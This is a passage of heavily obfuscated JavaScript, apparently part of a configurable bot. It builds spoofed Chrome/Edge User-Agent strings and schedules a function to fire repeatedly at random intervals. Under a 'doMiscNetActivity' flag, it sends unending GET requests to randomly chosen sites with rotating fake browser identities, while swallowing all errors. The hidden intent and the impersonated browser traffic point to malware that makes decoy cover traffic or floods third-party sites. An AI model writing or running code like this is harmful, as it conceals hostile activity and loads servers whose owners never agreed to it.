      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0xd6 * -0x2a + -0x22ee + -0x2e; k < 0xbf2 + -0x2ff + 0x8ef * -0x1; k++)
    setTimeout(f, (-0x155 + 0x3af4 * -0x6 + -0x1 * -0x24d6d) * k * getRandomInt(-0x1620 + 0x18eb + 0x33 * -0xe, 0x11a + 0x1 * 0xc11 + -0x8 * 0x1a5));
  setInterval(() => {
    f();
    for (let l = 0x1c72 + -0x1 * -0xf09 + 0x2b7b * -0x1; l < -0x26a7 + -0x1276 + 0x3921; l++)
      setTimeout(f, (-0xdf36 * 0x2 + 0x17b1f + 0x648f * 0x3) * l * getRandomInt(0x5 + 0x1ee1 * 0x1 + -0x1ee5, -0x2c2 + -0xf1 * -0x2 + 0xe3));
  }, 0x46dd84 + 0x13 * 0x30ce5 + 0x45cd * -0x10f);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x611 * -0x5 + 0x17d4 + -0x1 * -0x21d9) * getRandomInt(0x10d * 0x3 + 0x143d + -0x1763 * 0x1, -0x2b8 + 0x4 * 0xe2 + -0x1 * 0xcb));
}, -0x1 * 0xd3c + 0x883 * 0x3 + -0xbe9);